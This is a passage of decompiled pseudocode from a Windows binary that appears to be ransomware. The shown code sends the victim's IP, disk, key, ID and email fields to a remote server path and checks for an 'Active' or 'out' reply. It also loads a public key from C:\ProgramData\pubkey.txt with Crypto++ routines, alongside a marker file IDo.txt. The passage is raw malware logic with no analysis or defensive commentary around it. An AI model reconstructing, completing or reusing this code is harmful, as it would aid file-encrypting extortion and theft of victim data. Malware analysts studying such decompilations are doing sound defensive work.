    if ( v92 + 1 >= 0x1000 )
    {
      v134 = v92 + 36;
      v23 = *(void **)(v91[0] - 4);
      if ( v91[0] - (unsigned int)v23 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v23);
  }
  v91[4] = 0;
  v92 = 15;
  LOBYTE(v91[0]) = 0;
  sub_431F40(v102, 1);
  sub_419B80((int)v89, "/1614CEEEC50A9336EBF690886CAA747D6811C45D37086A3FA7B11C9E83926C6C");
  LOBYTE(v142) = 15;
  sub_431F50((void **)v102, v89);
  LOBYTE(v142) = 13;
  if ( v90 >= 0x10 )
  {
    v133 = v90 + 1;
    v24 = (void *)v89[0];
    if ( v90 + 1 >= 0x1000 )
    {
      v133 = v90 + 36;
      v24 = *(void **)(v89[0] - 4);
      if ( v89[0] - (unsigned int)v24 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v24);
  }
  v89[4] = 0;
  v90 = 15;
  LOBYTE(v89[0]) = 0;
  sub_431F20(v102, 1, 1);
  sub_419B80((int)v85, "me");
  LOBYTE(v142) = 16;
  sub_419B80((int)v87, "From");
  LOBYTE(v142) = 17;
  sub_431B30((int *)v102, v87, v85);
  LOBYTE(v142) = 16;
  if ( v88 >= 0x10 )
  {
    v140 = v88 + 1;
    v25 = (void *)v87[0];
    if ( v88 + 1 >= 0x1000 )
    {
      v140 = v88 + 36;
      v25 = *(void **)(v87[0] - 4);
      if ( (unsigned int)(v87[0] - (_DWORD)v25 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v25);
  }
  v87[4] = 0;
  v88 = 15;
  LOBYTE(v87[0]) = 0;
  LOBYTE(v142) = 13;
  if ( v86 >= 0x10 )
  {
    v131 = v86 + 1;
    v26 = (void *)v85[0];
    if ( v86 + 1 >= 0x1000 )
    {
      v131 = v86 + 36;
      v26 = *(void **)(v85[0] - 4);
      if ( v85[0] - (unsigned int)v26 - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v26);
  }
  v85[4] = 0;
  v86 = 15;
  LOBYTE(v85[0]) = 0;
  v27 = (char *)sub_428FD0(v103, (int)v67);
  LOBYTE(v142) = 18;
  v28 = (char *)sub_421FB0((int)v69, "&ip=", v27);
  LOBYTE(v142) = 19;
  v29 = (char *)sub_421F20((int)v71, v28, "&disk=");
  LOBYTE(v142) = 20;
  v30 = (char *)sub_422050((int)v65, v29, &v124);
  LOBYTE(v142) = 21;
  v31 = (char *)sub_421F20((int)v75, v30, "&key=");
  LOBYTE(v142) = 22;
  v32 = (char *)sub_422050((int)v77, v31, &a2);
  LOBYTE(v142) = 23;
  v33 = (char *)sub_421F20((int)v79, v32, "&id=");
  LOBYTE(v142) = 24;
  v34 = (char *)sub_422050((int)v81, v33, &a8);
  LOBYTE(v142) = 25;
  v35 = (char *)sub_421F20((int)v83, v34, "&mail=");
  LOBYTE(v142) = 26;
  v36 = sub_422050((int)v73, v35, &a14);
  LOBYTE(v142) = 27;
  sub_431B00((void **)v102, v36);
  LOBYTE(v142) = 26;
  if ( v74 >= 0x10 )
  {
    v130 = v74 + 1;
    v37 = (void *)v73[0];
    if ( v74 + 1 >= 0x1000 )
    {
      v130 = v74 + 36;
      v37 = *(void **)(v73[0] - 4);
      if ( (unsigned int)(v73[0] - (_DWORD)v37 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v37);
  }
  v73[4] = 0;
  v74 = 15;
  LOBYTE(v73[0]) = 0;
  LOBYTE(v142) = 25;
  if ( v84 >= 0x10 )
  {
    v129 = v84 + 1;
    v38 = (void *)v83[0];
    if ( v84 + 1 >= 0x1000 )
    {
      v129 = v84 + 36;
      v38 = *(void **)(v83[0] - 4);
      if ( (unsigned int)(v83[0] - (_DWORD)v38 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v38);
  }
  v83[4] = 0;
  v84 = 15;
  LOBYTE(v83[0]) = 0;
  LOBYTE(v142) = 24;
  if ( v82 >= 0x10 )
  {
    v128 = v82 + 1;
    v39 = (void *)v81[0];
    if ( v82 + 1 >= 0x1000 )
    {
      v128 = v82 + 36;
      v39 = *(void **)(v81[0] - 4);
      if ( (unsigned int)(v81[0] - (_DWORD)v39 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v39);
  }
  v81[4] = 0;
  v82 = 15;
  LOBYTE(v81[0]) = 0;
  LOBYTE(v142) = 23;
  if ( v80 >= 0x10 )
  {
    v127 = v80 + 1;
    v40 = (void *)v79[0];
    if ( v80 + 1 >= 0x1000 )
    {
      v127 = v80 + 36;
      v40 = *(void **)(v79[0] - 4);
      if ( (unsigned int)(v79[0] - (_DWORD)v40 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v40);
  }
  v79[4] = 0;
  v80 = 15;
  LOBYTE(v79[0]) = 0;
  LOBYTE(v142) = 22;
  if ( v78 >= 0x10 )
  {
    v132 = v78 + 1;
    v41 = (void *)v77[0];
    if ( v78 + 1 >= 0x1000 )
    {
      v132 = v78 + 36;
      v41 = *(void **)(v77[0] - 4);
      if ( (unsigned int)(v77[0] - (_DWORD)v41 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v41);
  }
  v77[4] = 0;
  v78 = 15;
  LOBYTE(v77[0]) = 0;
  LOBYTE(v142) = 21;
  if ( v76 >= 0x10 )
  {
    v123 = v76 + 1;
    v42 = (void *)v75[0];
    if ( v76 + 1 >= 0x1000 )
    {
      v123 = v76 + 36;
      v42 = *(void **)(v75[0] - 4);
      if ( (unsigned int)(v75[0] - (_DWORD)v42 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v42);
  }
  v75[4] = 0;
  v76 = 15;
  LOBYTE(v75[0]) = 0;
  LOBYTE(v142) = 20;
  if ( v66 >= 0x10 )
  {
    v122 = v66 + 1;
    v43 = (void *)v65[0];
    if ( v66 + 1 >= 0x1000 )
    {
      v122 = v66 + 36;
      v43 = *(void **)(v65[0] - 4);
      if ( (unsigned int)(v65[0] - (_DWORD)v43 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v43);
  }
  v65[4] = 0;
  v66 = 15;
  LOBYTE(v65[0]) = 0;
  LOBYTE(v142) = 19;
  if ( v72 >= 0x10 )
  {
    v121 = v72 + 1;
    v44 = (void *)v71[0];
    if ( v72 + 1 >= 0x1000 )
    {
      v121 = v72 + 36;
      v44 = *(void **)(v71[0] - 4);
      if ( (unsigned int)(v71[0] - (_DWORD)v44 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v44);
  }
  v71[4] = 0;
  v72 = 15;
  LOBYTE(v71[0]) = 0;
  LOBYTE(v142) = 18;
  if ( v70 >= 0x10 )
  {
    v120 = v70 + 1;
    v45 = (void *)v69[0];
    if ( v70 + 1 >= 0x1000 )
    {
      v120 = v70 + 36;
      v45 = *(void **)(v69[0] - 4);
      if ( (unsigned int)(v69[0] - (_DWORD)v45 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v45);
  }
  v69[4] = 0;
  v70 = 15;
  LOBYTE(v69[0]) = 0;
  LOBYTE(v142) = 13;
  if ( v68 >= 0x10 )
  {
    v119 = v68 + 1;
    v46 = (void *)v67[0];
    if ( v68 + 1 >= 0x1000 )
    {
      v119 = v68 + 36;
      v46 = *(void **)(v67[0] - 4);
      if ( (unsigned int)(v67[0] - (_DWORD)v46 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v46);
  }
  v67[4] = 0;
  v68 = 15;
  LOBYTE(v67[0]) = 0;
  memset(v101, 0, sizeof(v101));
  sub_430D40(v99, (int)v101, v102, qword_4F0148);
  LOBYTE(v142) = 28;
  v47 = sub_42F680((char *)v101);
  v48 = *((_DWORD *)v47 + 4);
  if ( *((_DWORD *)v47 + 5) >= 0x10u )
    v47 = *(char **)v47;
  if ( v48 == 6 && *(_DWORD *)v47 == 1769235265 && *((_WORD *)v47 + 2) == 25974 )
  {
    sub_419B10(v20, (int)v137);
    v98 = 1;
    LOBYTE(v142) = 13;
    sub_413190(v101);
    LOBYTE(v142) = 8;
    sub_413070((void **)v102);
    LOBYTE(v142) = 7;
    sub_412F60(v99);
    LOBYTE(v142) = 6;
    if ( v106 >= 0x10 )
    {
      v118 = v106 + 1;
      v49 = (void *)v104[0];
      if ( v106 + 1 >= 0x1000 )
      {
        v118 = v106 + 36;
        v49 = *(void **)(v104[0] - 4);
        if ( (unsigned int)(v104[0] - (_DWORD)v49 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v49);
    }
    v105 = 0;
    v106 = 15;
    LOBYTE(v104[0]) = 0;
    LOBYTE(v142) = 5;
    if ( v139 >= 0x10 )
    {
      v117 = v139 + 1;
      v50 = (void *)v137[0];
      if ( v139 + 1 >= 0x1000 )
      {
        v117 = v139 + 36;
        v50 = *(void **)(v137[0] - 4);
        if ( (unsigned int)(v137[0] - (_DWORD)v50 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v50);
    }
    v138 = 0;
    v139 = 15;
    LOBYTE(v137[0]) = 0;
    LOBYTE(v142) = 4;
    if ( v126 >= 0x10 )
    {
      v116 = v126 + 1;
      v51 = v124;
      if ( v126 + 1 >= 0x1000 )
      {
        v116 = v126 + 36;
        v51 = (_BYTE *)*((_DWORD *)v124 - 1);
        if ( (unsigned int)(v124 - v51 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v51);
    }
    v125 = 0;
    v126 = 15;
    LOBYTE(v124) = 0;
    LOBYTE(v142) = 2;
    if ( a7 >= 0x10 )
    {
      v115 = a7 + 1;
      v52 = a2;
      if ( a7 + 1 >= 0x1000 )
      {
        v115 = a7 + 36;
        v52 = (_BYTE *)*((_DWORD *)a2 - 1);
        if ( (unsigned int)(a2 - v52 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v52);
    }
    a6 = 0;
    a7 = 15;
    LOBYTE(a2) = 0;
    LOBYTE(v142) = 1;
    if ( a13 >= 0x10 )
    {
      v114 = a13 + 1;
      v53 = a8;
      if ( a13 + 1 >= 0x1000 )
      {
        v114 = a13 + 36;
        v53 = (_BYTE *)*((_DWORD *)a8 - 1);
        if ( (unsigned int)(a8 - v53 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_46C87D(v53);
    }
    a12 = 0;
    a13 = 15;
    LOBYTE(a8) = 0;
    LOBYTE(v142) = 0;
    if ( a19 >= 0x10 )
    {
      v113 = a19 + 1;
      v54 = a14;
      v55 = a14;
      if ( a19 + 1 >= 0x1000 )
      {
        v113 = a19 + 36;
        goto LABEL_93;
      }
      goto LABEL_94;
    }
    goto LABEL_95;
  }
  v57 = sub_42F680((char *)v101);
  v58 = *((_DWORD *)v57 + 4);
  if ( *((_DWORD *)v57 + 5) >= 0x10u )
    v57 = *(char **)v57;
  if ( v58 == 3 && *(_WORD *)v57 == 30063 && v57[2] == 116 )
  {
    _loaddll(0);
    goto LABEL_147;
  }
  sub_419B10(v20, (int)v104);
  v98 = 1;
  LOBYTE(v142) = 13;
  sub_413190(v101);
  LOBYTE(v142) = 8;
  sub_413070((void **)v102);
  LOBYTE(v142) = 7;
  sub_412F60(v99);
  LOBYTE(v142) = 6;
  if ( v106 < 0x10 )
    goto LABEL_105;
  v112 = v106 + 1;
  v59 = (void *)v104[0];
  if ( v106 + 1 >= 0x1000 )
  {
    v112 = v106 + 36;
    v59 = *(void **)(v104[0] - 4);
    if ( (unsigned int)(v104[0] - (_DWORD)v59 - 4) > 0x1F )
LABEL_147:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_46C87D(v59);
LABEL_105:
  v105 = 0;
  v106 = 15;
  LOBYTE(v104[0]) = 0;
  LOBYTE(v142) = 5;
  if ( v139 >= 0x10 )
  {
    v111 = v139 + 1;
    v60 = (void *)v137[0];
    if ( v139 + 1 >= 0x1000 )
    {
      v111 = v139 + 36;
      v60 = *(void **)(v137[0] - 4);
      if ( (unsigned int)(v137[0] - (_DWORD)v60 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v60);
  }
  v138 = 0;
  v139 = 15;
  LOBYTE(v137[0]) = 0;
  LOBYTE(v142) = 4;
  if ( v126 >= 0x10 )
  {
    v110 = v126 + 1;
    v61 = v124;
    if ( v126 + 1 >= 0x1000 )
    {
      v110 = v126 + 36;
      v61 = (_BYTE *)*((_DWORD *)v124 - 1);
      if ( (unsigned int)(v124 - v61 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v61);
  }
  v125 = 0;
  v126 = 15;
  LOBYTE(v124) = 0;
  LOBYTE(v142) = 2;
  if ( a7 >= 0x10 )
  {
    v109 = a7 + 1;
    v62 = a2;
    if ( a7 + 1 >= 0x1000 )
    {
      v109 = a7 + 36;
      v62 = (_BYTE *)*((_DWORD *)a2 - 1);
      if ( (unsigned int)(a2 - v62 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v62);
  }
  a6 = 0;
  a7 = 15;
  LOBYTE(a2) = 0;
  LOBYTE(v142) = 1;
  if ( a13 >= 0x10 )
  {
    v108 = a13 + 1;
    v63 = a8;
    if ( a13 + 1 >= 0x1000 )
    {
      v108 = a13 + 36;
      v63 = (_BYTE *)*((_DWORD *)a8 - 1);
      if ( (unsigned int)(a8 - v63 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v63);
  }
  a12 = 0;
  a13 = 15;
  LOBYTE(a8) = 0;
  LOBYTE(v142) = 0;
  if ( a19 >= 0x10 )
  {
    v107 = a19 + 1;
    v54 = a14;
    v55 = a14;
    if ( a19 + 1 >= 0x1000 )
    {
      v107 = a19 + 36;
LABEL_93:
      v54 = (char *)*((_DWORD *)v54 - 1);
      if ( (unsigned int)(v55 - v54 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
LABEL_94:
    sub_46C87D(v54);
  }
LABEL_95:
  a18 = 0;
  a19 = 15;
  LOBYTE(a14) = 0;
  return v20;
}
// 411FD1: variable 'v19' is possibly undefined
// 4F0148: using guessed type __int64 qword_4F0148;
// 411FA0: using guessed type __int64 var_158;
// 411FA0: using guessed type size_t var_1A0[18];

//----- (00412F60) --------------------------------------------------------
int __thiscall sub_412F60(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  void *v4; // eax

  v2 = this[16];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[11];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[15] = 0;
  this[16] = 15;
  *((_BYTE *)this + 44) = 0;
  v4 = (void *)this[6];
  if ( v4 )
  {
    if ( (unsigned int)(this[8] - (_DWORD)v4) < 0x1000 )
    {
LABEL_10:
      sub_46C87D(v4);
      this[6] = 0;
      this[7] = 0;
      this[8] = 0;
      return sub_428550(this);
    }
    if ( (unsigned int)v4 - *((_DWORD *)v4 - 1) - 4 <= 0x1F )
    {
      v4 = (void *)*((_DWORD *)v4 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
  return sub_428550(this);
}

//----- (00413070) --------------------------------------------------------
void __thiscall sub_413070(void **this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  void *v5; // eax
  void *v6; // esi

  v2 = (unsigned int)this[16];
  if ( v2 >= 0x10 )
  {
    v3 = this[11];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_12;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[15] = 0;
  this[16] = (void *)15;
  *((_BYTE *)this + 44) = 0;
  v4 = (unsigned int)this[8];
  if ( v4 >= 0x10 )
  {
    v5 = this[3];
    if ( v4 + 1 < 0x1000 )
    {
LABEL_10:
      sub_46C87D(v5);
      goto LABEL_11;
    }
    if ( (unsigned int)v5 - *((_DWORD *)v5 - 1) - 4 <= 0x1F )
    {
      v5 = (void *)*((_DWORD *)v5 - 1);
      goto LABEL_10;
    }
LABEL_12:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_11:
  this[7] = 0;
  this[8] = (void *)15;
  *((_BYTE *)this + 12) = 0;
  v6 = *this;
  sub_4216A0(*((_DWORD **)*this + 1));
  *((_DWORD *)*this + 1) = v6;
  *(_DWORD *)*this = v6;
  *((_DWORD *)*this + 2) = v6;
  this[1] = 0;
  sub_46C87D(*this);
}

//----- (00413190) --------------------------------------------------------
void __thiscall sub_413190(void **this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  void *v4; // esi

  v2 = (unsigned int)this[10];
  if ( v2 >= 0x10 )
  {
    v3 = this[5];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
  }
  this[9] = 0;
  this[10] = (void *)15;
  *((_BYTE *)this + 20) = 0;
  v4 = *this;
  sub_4216A0(*((_DWORD **)*this + 1));
  *((_DWORD *)*this + 1) = v4;
  *(_DWORD *)*this = v4;
  *((_DWORD *)*this + 2) = v4;
  this[1] = 0;
  sub_46C87D(*this);
}

//----- (00413270) --------------------------------------------------------
int __thiscall sub_413270(_DWORD *this)
{
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  v2 = this + 4;
  v3 = (_DWORD *)this[6];
  if ( v3 )
  {
    if ( (unsigned int)(this[8] - (_DWORD)v3) >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_46C87D(v3);
    v2[2] = 0;
    v2[3] = 0;
    v2[4] = 0;
  }
  return sub_428550(this);
}

//----- (00413320) --------------------------------------------------------
void __thiscall sub_413320(void **this)
{
  void *v2; // esi

  v2 = *this;
  sub_4216A0(*((_DWORD **)*this + 1));
  *((_DWORD *)*this + 1) = v2;
  *(_DWORD *)*this = v2;
  *((_DWORD *)*this + 2) = v2;
  this[1] = 0;
  sub_46C87D(*this);
}

//----- (004133A0) --------------------------------------------------------
void __thiscall sub_4133A0(_DWORD *this)
{
  _DWORD *v2; // eax

  v2 = (_DWORD *)this[2];
  if ( v2 )
  {
    if ( (unsigned int)(this[4] - (_DWORD)v2) >= 0x1000 )
    {
      if ( (unsigned int)v2 - *(v2 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v2 = (_DWORD *)*(v2 - 1);
    }
    sub_46C87D(v2);
    this[2] = 0;
    this[3] = 0;
    this[4] = 0;
  }
}

//----- (00413430) --------------------------------------------------------
unsigned int *__usercall sub_413430@<eax>(
        int a1@<ecx>,
        int a2@<ebp>,
        int a3@<edi>,
        int a4@<esi>,
        _BYTE *a5,
        int a6,
        int a7,
        int a8,
        int a9,
        unsigned int a10,
        __int64 a11)
{
  void *v11; // esp
  bool v12; // al
  unsigned int v13; // eax
  void *v14; // edx
  void *v15; // ecx
  void *v16; // edx
  void *v17; // ecx
  void **v18; // esi
  void *v19; // eax
  void *v20; // ecx
  _DWORD *v21; // eax
  int v22; // eax
  void **v23; // esi
  int v24; // ecx
  int v25; // edi
  unsigned int v26; // edi
  char v27; // al
  void *v28; // edx
  void *v29; // ecx
  const WCHAR *v30; // eax
  __int64 directory; // rax
  void *v32; // edx
  void *v33; // ecx
  unsigned int v34; // eax
  void **v35; // ecx
  unsigned int v36; // eax
  void **v37; // ecx
  int v38; // esi
  int v39; // edi
  void *v40; // edx
  void *v41; // ecx
  void *v42; // edx
  void *v43; // ecx
  unsigned int v44; // edi
  void *v45; // edx
  void *v46; // ecx
  __int128 *v47; // eax
  unsigned int *v48; // ecx
  unsigned int v49; // edx
  void *v50; // esi
  void **v51; // esi
  void **v52; // esi
  void **v53; // esi
  int v54; // ecx
  _DWORD *v55; // eax
  int v56; // eax
  char v57; // al
  unsigned int v58; // ecx
  void *v59; // edx
  void **v60; // eax
  int v61; // ecx
  int v62; // ecx
  void *v63; // edx
  int v64; // edx
  void *v65; // ecx
  unsigned int *v66; // esi
  int v67; // edx
  void *v68; // ecx
  int v69; // edx
  void *v70; // ecx
  int v71; // edx
  _BYTE *v72; // ecx
  _BYTE *v74[6]; // [esp-1944h] [ebp-1950h] BYREF
  _BYTE *v75[6]; // [esp-192Ch] [ebp-1938h] BYREF
  char *v76[2]; // [esp-1914h] [ebp-1920h] BYREF
  int v77; // [esp-190Ch] [ebp-1918h]
  int v78; // [esp-1908h] [ebp-1914h]
  int v79; // [esp-1904h] [ebp-1910h]
  unsigned int v80; // [esp-1900h] [ebp-190Ch]
  int v81; // [esp-18F4h] [ebp-1900h]
  int v82; // [esp-18F0h] [ebp-18FCh]
  int v83; // [esp-18ECh] [ebp-18F8h]
  int v84; // [esp-18E8h] [ebp-18F4h]
  int v85; // [esp-18E0h] [ebp-18ECh]
  int v86; // [esp-18DCh] [ebp-18E8h]
  int v87; // [esp-18D8h] [ebp-18E4h]
  int v88; // [esp-18D4h] [ebp-18E0h]
  int v89; // [esp-18D0h] [ebp-18DCh]
  void *v90; // [esp-18CCh] [ebp-18D8h]
  int v91[5]; // [esp-18C8h] [ebp-18D4h] BYREF
  unsigned int *v92; // [esp-18B4h] [ebp-18C0h]
  int v93; // [esp-18B0h] [ebp-18BCh]
  _DWORD v94[2]; // [esp-18ACh] [ebp-18B8h] BYREF
  unsigned int v95; // [esp-18A4h] [ebp-18B0h] BYREF
  unsigned int v96; // [esp-18A0h] [ebp-18ACh] BYREF
  void *v97; // [esp-189Ch] [ebp-18A8h]
  unsigned int v98; // [esp-1898h] [ebp-18A4h]
  void **v99; // [esp-1894h] [ebp-18A0h]
  int v100; // [esp-1890h] [ebp-189Ch]
  const char *v101; // [esp-188Ch] [ebp-1898h] BYREF
  int v102; // [esp-1888h] [ebp-1894h] BYREF
  FILE *v103[46]; // [esp-5B8h] [ebp-5C4h] BYREF
  FILE *v104[44]; // [esp-500h] [ebp-50Ch] BYREF
  FILE *v105[46]; // [esp-450h] [ebp-45Ch] BYREF
  _DWORD v106[32]; // [esp-398h] [ebp-3A4h] BYREF
  _DWORD v107[20]; // [esp-318h] [ebp-324h] BYREF
  _DWORD v108[20]; // [esp-2C8h] [ebp-2D4h] BYREF
  void (__thiscall **v109[66])(int, _DWORD, _DWORD *); // [esp-278h] [ebp-284h] BYREF
  _DWORD v110[22]; // [esp-170h] [ebp-17Ch] BYREF
  _DWORD v111[19]; // [esp-118h] [ebp-124h] BYREF
  char v112; // [esp-CCh] [ebp-D8h] BYREF
  _DWORD v113[16]; // [esp-C8h] [ebp-D4h] BYREF
  int v114; // [esp-88h] [ebp-94h]
  unsigned int v115; // [esp-84h] [ebp-90h]
  void *v116[4]; // [esp-80h] [ebp-8Ch] BYREF
  unsigned int v117; // [esp-70h] [ebp-7Ch]
  unsigned int v118; // [esp-6Ch] [ebp-78h]
  void *v119[4]; // [esp-68h] [ebp-74h] BYREF
  int v120; // [esp-58h] [ebp-64h]
  unsigned int v121; // [esp-54h] [ebp-60h]
  __int128 v122; // [esp-50h] [ebp-5Ch] BYREF
  __int64 v123; // [esp-40h] [ebp-4Ch]
  void *v124[3]; // [esp-38h] [ebp-44h] BYREF
  void **v125; // [esp-2Ch] [ebp-38h] BYREF
  void (__thiscall ***v126)(_DWORD, int); // [esp-28h] [ebp-34h]
  unsigned int v127; // [esp-24h] [ebp-30h]
  _BYTE v128[8]; // [esp-20h] [ebp-2Ch] BYREF
  int v129; // [esp-18h] [ebp-24h]
  int *v130; // [esp-14h] [ebp-20h]
  int *v131; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v133; // [esp-8h] [ebp-14h]
  int v134; // [esp-4h] [ebp-10h]
  _DWORD v135[2]; // [esp+0h] [ebp-Ch] BYREF
  int v136; // [esp+8h] [ebp-4h] BYREF
  void *retaddr; // [esp+Ch] [ebp+0h]

  v135[0] = a2;
  v135[1] = retaddr;
  v134 = -1;
  v133 = &loc_4AEEAB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v130 = &v136;
  v129 = a1;
  v11 = alloca(6308);
  v91[2] = a4;
  v91[1] = a3;
  v131 = v91;
  v92 = (unsigned int *)a1;
  v101 = (const char *)a1;
  v91[4] = a1;
  v100 = 0;
  v134 = 4;
  v123 = 0xF00000000i64;
  LOBYTE(v122) = 0;
  v93 = 0;
  v117 = 0;
  v118 = 15;
  LOBYTE(v116[0]) = 0;
  LOBYTE(v101) = 0;
  v99 = v119;
  sub_427E80((int)v101, "C:\\ProgramData\\IDo.txt", 0x16u);
  LOBYTE(v134) = 5;
  v100 = 1;
  if ( !sub_404AA0((WCHAR *)v119) )
    goto LABEL_3;
  LOBYTE(v101) = 0;
  v99 = (void **)v94;
  v134 = 6;
  sub_427E80((int)v101, "C:\\ProgramData\\pubkey.txt", 0x19u);
  v134 = 7;
  v100 = 3;
  v12 = sub_404AA0((WCHAR *)v94);
  v128[0] = 1;
  if ( !v12 )
LABEL_3:
    v128[0] = 0;
  v134 = 5;
  v13 = v100;
  if ( (v100 & 2) != 0 )
  {
    v13 = v100 & 0xFFFFFFFD;
    v100 &= ~2u;
    v134 = 5;
    if ( v98 >= 8 )
    {
      v14 = (void *)(2 * v98 + 2);
      v15 = (void *)v94[0];
      if ( (unsigned int)v14 >= 0x1000 )
      {
        v14 = (void *)(2 * v98 + 37);
        v15 = *(void **)(v94[0] - 4);
        if ( (unsigned int)(v94[0] - (_DWORD)v15 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v90 = v14;
      sub_46C87D(v15);
      v13 = v100;
    }
    v97 = 0;
    v98 = 7;
    LOWORD(v94[0]) = 0;
  }
  v134 = 3;
  if ( (v13 & 1) != 0 )
  {
    v100 = v13 & 0xFFFFFFFE;
    LOBYTE(v134) = 3;
    if ( v121 >= 8 )
    {
      v16 = (void *)(2 * v121 + 2);
      v17 = v119[0];
      if ( (unsigned int)v16 >= 0x1000 )
      {
        v16 = (void *)(2 * v121 + 37);
        v17 = (void *)*((_DWORD *)v119[0] - 1);
        if ( (unsigned int)(v119[0] - v17 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v90 = v16;
      sub_46C87D(v17);
    }
    v120 = 0;
    v121 = 7;
    LOWORD(v119[0]) = 0;
  }
  if ( v128[0] )
  {
    memset(v113, 0, sizeof(v113));
    sub_40A110(v113, 1);
    LOBYTE(v134) = 10;
    memset(v110, 0, sizeof(v110));
    v18 = (void **)operator new(0x3Cu);
    v99 = v18;
    LOBYTE(v134) = 11;
    memset(v18, 0, 0x3Cu);
    v19 = sub_439290();
    sub_4080A0(v18, (int)v135, (int)v19, 6, 0);
    *v18 = &CryptoPP::Base64Decoder::`vftable';
    v18[1] = &CryptoPP::Base64Decoder::`vftable';
    LOBYTE(v134) = 10;
    v128[0] = 1;
    v101 = "C:\\ProgramData\\pubkey.txt";
    sub_4180C0((int)v110, (int)v18);
    LOBYTE(v134) = 13;
    v110[0] = &CryptoPP::FileSource::`vftable';
    v110[1] = &CryptoPP::FileSource::`vftable';
    v90 = v20;
    v21 = sub_4224C0(&v125, (int)"InputFileName", &v101);
    LOBYTE(v134) = 14;
    v22 = sub_426840((int)v21, (int)"InputBinaryMode", v128, *((_BYTE *)v21 + 8));
    (*(void (__thiscall **)(_DWORD *, int))(v110[0] + 32))(v110, v22);
    (*(void (__thiscall **)(_DWORD *, int))(v110[0] + 200))(v110, 1);
    LOBYTE(v134) = 15;
    if ( v126 )
      (**v126)(v126, 1);
    v125 = &CryptoPP::NameValuePairs::`vftable';
    LOBYTE(v134) = 17;
    sub_433390(&v113[1], v110);
    memset(v111, 0, sizeof(v111));
    v23 = (void **)operator new(0x10u);
    v99 = v23;
    LOBYTE(v134) = 18;
    *(_OWORD *)v23 = 0i64;
    sub_435E90(v23, 0);
    *v23 = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v23[1] = &CryptoPP::StringSinkTemplate<std::string>::`vftable';
    v23[3] = v116;
    LOBYTE(v134) = 17;
    sub_408D50(v111, (int)v23, v86, v87);
    LOBYTE(v134) = 19;
    sub_433D80(&v113[1], (int)v111);
    (*(void (__thiscall **)(_DWORD *, _DWORD, _DWORD, int, int))(v111[0] + 24))(v111, 0, 0, -1, 1);
    memset(v105, 0, sizeof(v105));
    sub_41B470(v105, v24, v82, v83, v84);
    LOBYTE(v134) = 20;
    sub_426290(v105, (int)&v122);
    sub_41B400(v105);
    LOBYTE(v134) = 19;
    sub_414850((char *)v105);
    v111[0] = &CryptoPP::ProxyFilter::`vftable';
    v111[1] = &CryptoPP::ProxyFilter::`vftable';
    LOBYTE(v134) = 23;
    if ( v111[18] )
      (**(void (__thiscall ***)(_DWORD, int))v111[18])(v111[18], 1);
    LOBYTE(v134) = 17;
    sub_406C70(v111);
    LOBYTE(v134) = 10;
    sub_4181B0(v110);
